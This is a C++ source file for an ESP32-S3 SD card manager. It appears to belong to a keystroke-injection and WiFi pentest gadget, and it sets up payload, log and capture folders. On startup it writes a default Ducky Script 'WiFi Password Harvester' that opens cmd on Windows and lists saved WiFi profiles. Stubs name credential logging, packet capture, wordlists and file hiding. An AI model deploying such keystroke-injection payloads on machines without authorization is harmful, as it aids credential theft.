#include "SDCardManager.h"
#include <SD.h>
#include <SPI.h>
#include <esp_log.h>

static const char* TAG = "SDCardManager";

// Constructor
SDCardManager::SDCardManager() : initialized(false), mounted(false), totalSpace(0), usedSpace(0), spi(nullptr) {
    memset(encryptionKey, 0, sizeof(encryptionKey));
}

// Destructor
SDCardManager::~SDCardManager() {
    if (initialized) {
        unmount();
    }
    if (spi) {
        delete spi;
    }
}

// Initialize with specific CS pin
bool SDCardManager::begin(int csPin) {
    if (initialized) return true;
    
    ESP_LOGI(TAG, "=== SD CARD INITIALIZATION ===");
    ESP_LOGI(TAG, "CS Pin: %d", csPin);
    ESP_LOGI(TAG, "Waveshare ESP32-S3-LCD-1.47 SD Pins:");
    ESP_LOGI(TAG, "  SD_SCK: GPIO14");
    ESP_LOGI(TAG, "  SD_D0 (MISO): GPIO16"); 
    ESP_LOGI(TAG, "  SD_CMD (MOSI): GPIO15");
    ESP_LOGI(TAG, "  SD_D3 (CS): GPIO21");
    
    // Configure SPI for Waveshare ESP32-S3-LCD-1.47
    // ESP32-S3 uses SPI2 (FSPI) or SPI3 (HSPI)
    spi = new SPIClass(FSPI);
    
    // Initialize SPI with correct pins for SD card
    // Note: Waveshare uses SD_CMD (GPIO15) for MOSI, SD_D0 (GPIO16) for MISO
    spi->begin(14, 16, 15, csPin); // SCK, MISO, MOSI, CS
    
    // Start with very slow SPI frequency for initialization (400kHz)
    spi->setFrequency(400000);
    
    // Add small delay before first attempt
    delay(100);
    
    // Try multiple times with delays
    bool success = false;
    for (int attempt = 0; attempt < 3; attempt++) {
        ESP_LOGI(TAG, "SD card init attempt %d/3", attempt + 1);
        
        // Try to begin SD card
        if (SD.begin(csPin, *spi)) {
            ESP_LOGI(TAG, "SD.begin() returned true on attempt %d", attempt + 1);
            success = true;
            break;
        } else {
            ESP_LOGE(TAG, "SD.begin() returned false on attempt %d", attempt + 1);
            // Try different approaches for each attempt
            if (attempt == 1) {
                ESP_LOGI(TAG, "Trying without custom SPI (using default SD library SPI)");
                // Delete custom SPI and try default
                delete spi;
                spi = nullptr;
                
                // Try with just CS pin
                if (SD.begin(csPin)) {
                    ESP_LOGI(TAG, "Success with default SPI!");
                    success = true;
                    break;
                }
                
                // Recreate custom SPI for next attempt
                spi = new SPIClass(FSPI);
                spi->begin(14, 16, 15, csPin);
                spi->setFrequency(400000);
            } else if (attempt == 2) {
                ESP_LOGI(TAG, "Trying different CS pin (GPIO 10)");
                // Try CS pin 10 instead of 21
                if (SD.begin(10, *spi)) {
                    ESP_LOGI(TAG, "Success with CS pin 10!");
                    success = true;
                    break;
                }
            }
        }
        delay(500);
    }
    
    if (!success) {
        ESP_LOGE(TAG, "SD card initialization failed after 3 attempts!");
        ESP_LOGE(TAG, "Please check:");
        ESP_LOGE(TAG, "1. SD card is properly inserted");
        ESP_LOGE(TAG, "2. SD card is formatted as FAT32");
        ESP_LOGE(TAG, "3. SD card is not damaged");
        ESP_LOGE(TAG, "4. Wiring connections are correct");
        delete spi;
        spi = nullptr;
        return false;
    }
    
    // Check if we're using custom SPI or default
    if (!spi) {
        ESP_LOGI(TAG, "Using default SD library SPI configuration");
    }
    
    uint8_t cardType = SD.cardType();
    ESP_LOGI(TAG, "Card type check: %d", cardType);
    ESP_LOGI(TAG, "CARD_NONE=%d, CARD_MMC=%d, CARD_SD=%d, CARD_SDHC=%d", 
              CARD_NONE, CARD_MMC, CARD_SD, CARD_SDHC);
    
    if (cardType == CARD_NONE) {
        ESP_LOGE(TAG, "No SD card detected (CARD_NONE)");
        ESP_LOGI(TAG, "Possible causes:");
        ESP_LOGI(TAG, "- Card not inserted properly");
        ESP_LOGI(TAG, "- Card contacts dirty");
        ESP_LOGI(TAG, "- Wrong CS pin");
        ESP_LOGI(TAG, "- SPI conflict with display");
        return false;
    } else if (cardType == CARD_MMC) {
        ESP_LOGI(TAG, "Card type: MMC");
    } else if (cardType == CARD_SD) {
        ESP_LOGI(TAG, "Card type: SD");
    } else if (cardType == CARD_SDHC) {
        ESP_LOGI(TAG, "Card type: SDHC (High Capacity)");
    } else {
        ESP_LOGI(TAG, "Card type: Unknown (%d)", cardType);
    }
    
    totalSpace = SD.totalBytes();
    usedSpace = SD.usedBytes();
    
    ESP_LOGI(TAG, "SD Card initialized successfully!");
    ESP_LOGI(TAG, "Total space: %llu MB", totalSpace / (1024 * 1024));
    ESP_LOGI(TAG, "Used space: %llu MB", usedSpace / (1024 * 1024));
    ESP_LOGI(TAG, "Free space: %llu MB", (totalSpace - usedSpace) / (1024 * 1024));
    
    // Create directory structure
    ensureDirectory("/mct2032");
    ensureDirectory("/mct2032/payloads");
    ensureDirectory("/mct2032/payloads/windows");
    ensureDirectory("/mct2032/payloads/macos");
    ensureDirectory("/mct2032/payloads/linux");
    ensureDirectory("/mct2032/logs");
    ensureDirectory("/mct2032/captures");
    
    initialized = true;
    mounted = true;
    
    // Create default Ducky Script payloads
    const char* wifiHarvest = 
        "REM Windows WiFi Password Harvester\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING cmd\n"
        "ENTER\n"
        "DELAY 1000\n"
        "STRING for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr /c:\"All User Profile\"') do @echo %a\n"
        "ENTER\n";
    
    savePayload("windows", "wifi_harvest.txt", wifiHarvest);
    
    return true;
}

// Initialize (calls begin with default pin)
bool SDCardManager::init() {
    return begin(21); // Default CS pin for Waveshare
}

// Mount SD card
bool SDCardManager::mount() {
    if (!initialized) return false;
    mounted = true;
    return true;
}

// Unmount SD card
void SDCardManager::unmount() {
    if (mounted) {
        SD.end();
        mounted = false;
    }
}

// Helper functions
String SDCardManager::getTimestamp() {
    return String(millis());
}

String SDCardManager::sanitizeFilename(String filename) {
    filename.replace("/", "_");
    filename.replace("\\", "_");
    filename.replace(":", "_");
    return filename;
}

bool SDCardManager::ensureDirectory(const char* path) {
    if (!SD.exists(path)) {
        return SD.mkdir(path);
    }
    return true;
}

// Space management
uint64_t SDCardManager::getTotalSpace() {
    return initialized ? SD.totalBytes() : 0;
}

uint64_t SDCardManager::getUsedSpace() {
    return initialized ? SD.usedBytes() : 0;
}

uint64_t SDCardManager::getFreeSpace() {
    return initialized ? (SD.totalBytes() - SD.usedBytes()) : 0;
}

bool SDCardManager::hasSpace(size_t bytes) {
    return getFreeSpace() > bytes;
}

// Directory operations
bool SDCardManager::createDirectory(const char* path) {
    if (!initialized) return false;
    return SD.mkdir(path);
}

bool SDCardManager::removeDirectory(const char* path) {
    if (!initialized) return false;
    return SD.rmdir(path);
}

std::vector<String> SDCardManager::listDirectory(const char* path) {
    std::vector<String> files;
    if (!initialized) return files;
    
    File dir = SD.open(path);
    if (!dir || !dir.isDirectory()) return files;
    
    File file = dir.openNextFile();
    while (file) {
        files.push_back(String(file.name()));
        file = dir.openNextFile();
    }
    
    return files;
}

// File operations
bool SDCardManager::writeFile(const char* path, const uint8_t* data, size_t len) {
    if (!initialized) return false;
    
    File file = SD.open(path, FILE_WRITE);
    if (!file) return false;
    
    size_t written = file.write(data, len);
    file.close();
    return written == len;
}

bool SDCardManager::appendFile(const char* path, const uint8_t* data, size_t len) {
    if (!initialized) return false;
    
    File file = SD.open(path, FILE_APPEND);
    if (!file) return false;
    
    size_t written = file.write(data, len);
    file.close();
    return written == len;
}

bool SDCardManager::readFile(const char* path, uint8_t* buffer, size_t maxLen) {
    if (!initialized) return false;
    
    File file = SD.open(path, FILE_READ);
    if (!file) return false;
    
    size_t bytesRead = file.read(buffer, maxLen);
    file.close();
    return bytesRead > 0;
}

bool SDCardManager::deleteFile(const char* path) {
    if (!initialized) return false;
    return SD.remove(path);
}

bool SDCardManager::fileExists(const char* path) {
    if (!initialized) return false;
    return SD.exists(path);
}

size_t SDCardManager::getFileSize(const char* path) {
    if (!initialized) return 0;
    
    File file = SD.open(path, FILE_READ);
    if (!file) return 0;
    
    size_t size = file.size();
    file.close();
    return size;
}

// Payload management
String SDCardManager::loadPayload(const char* os, const char* payloadName) {
    if (!initialized) return "";
    
    String path = String("/mct2032/payloads/") + os + "/" + payloadName;
    
    File file = SD.open(path, FILE_READ);
    if (!file) {
        ESP_LOGE(TAG, "Failed to open payload: %s", path.c_str());
        return "";
    }
    
    String content = file.readString();
    file.close();
    
    ESP_LOGI(TAG, "Loaded payload %s (%d bytes)", payloadName, content.length());
    return content;
}

bool SDCardManager::savePayload(const char* os, const char* payloadName, const char* content) {
    if (!initialized) return false;
    
    String dir = String("/mct2032/payloads/") + os;
    ensureDirectory(dir.c_str());
    
    String path = dir + "/" + payloadName;
    File file = SD.open(path, FILE_WRITE);
    if (!file) {
        ESP_LOGE(TAG, "Failed to create payload: %s", path.c_str());
        return false;
    }
    
    size_t written = file.print(content);
    file.close();
    
    ESP_LOGI(TAG, "Saved payload %s (%d bytes)", payloadName, written);
    return written > 0;
}

std::vector<String> SDCardManager::listPayloads(const char* os) {
    std::vector<String> payloads;
    if (!initialized) return payloads;
    
    String path = String("/mct2032/payloads/");
    if (os) path += os;
    
    return listDirectory(path.c_str());
}

// Data logging
bool SDCardManager::logWiFiScan(const JsonDocument& scanData) {
    if (!initialized) return false;
    
    String filename = "/mct2032/logs/wifi_scan_" + getTimestamp() + ".json";
    
    File file = SD.open(filename, FILE_WRITE);
    if (!file) return false;
    
    serializeJson(scanData, file);
    file.close();
    return true;
}

// Stub implementations for remaining methods
bool SDCardManager::logNetworkScan(const JsonDocument& networkData) { return false; }
bool SDCardManager::logCredentials(const String& credentials, bool encrypt) { return false; }
bool SDCardManager::logPacketCapture(const uint8_t* packet, size_t len) { return false; }
File SDCardManager::startPCAPCapture(const char* filename) { return File(); }
bool SDCardManager::writePCAPPacket(File& pcapFile, const uint8_t* packet, size_t len, uint32_t timestamp) { return false; }
void SDCardManager::closePCAPCapture(File& pcapFile) {}
std::vector<String> SDCardManager::listPlugins() { return std::vector<String>(); }
String SDCardManager::loadPlugin(const char* pluginName) { return ""; }
bool SDCardManager::executePlugin(const char* pluginName) { return false; }
bool SDCardManager::saveConfig(const char* configName, const JsonDocument& config) { return false; }
bool SDCardManager::loadConfig(const char* configName, JsonDocument& config) { return false; }
bool SDCardManager::encryptData(const uint8_t* data, size_t len, uint8_t* output) { return false; }
bool SDCardManager::decryptData(const uint8_t* data, size_t len, uint8_t* output) { return false; }
bool SDCardManager::secureDelete(const char* path) { return deleteFile(path); }
bool SDCardManager::loadWordlist(const char* name, std::vector<String>& words) { return false; }
bool SDCardManager::saveWordlist(const char* name, const std::vector<String>& words) { return false; }
bool SDCardManager::hideFile(const char* path) { return false; }